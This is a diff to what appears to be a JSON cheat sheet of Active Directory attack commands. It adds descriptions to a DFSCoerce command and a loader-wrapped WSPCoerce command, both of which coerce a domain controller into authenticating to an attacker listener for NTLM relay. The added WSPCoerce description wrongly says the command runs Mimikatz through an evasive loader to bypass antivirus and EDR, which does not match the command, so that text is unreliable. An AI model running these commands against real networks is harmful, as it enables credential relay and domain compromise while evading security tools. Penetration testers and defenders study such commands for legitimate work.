@@ -32,11 +32,13 @@
   "variations": [
     {
       "label": "DFSCoerce",
-      "command": "DFSCoerce-andrea.exe -t <target_dc> -l <listener_host>"
+      "command": "DFSCoerce-andrea.exe -t <target_dc> -l <listener_host>",
+      "description": "Exploits the DFS (Distributed File System) service to coerce NTLM authentication from a domain controller. Forces the DC to authenticate to your listener for relay attacks."
     },
     {
       "label": "WSPCoerce (via Loader, in-memory)",
-      "command": "Loader.exe -path C:\\AD\\tools\\WSPCoerce.exe -args <target_dc> <listener_host>"
+      "command": "Loader.exe -path C:\\AD\\tools\\WSPCoerce.exe -args <target_dc> <listener_host>",
+      "description": "Runs a Mimikatz operation through an evasive loader (e.g., SafetyKatz) to bypass antivirus and EDR detections that would flag direct Mimikatz execution."
     }
   ],
   "steps": [
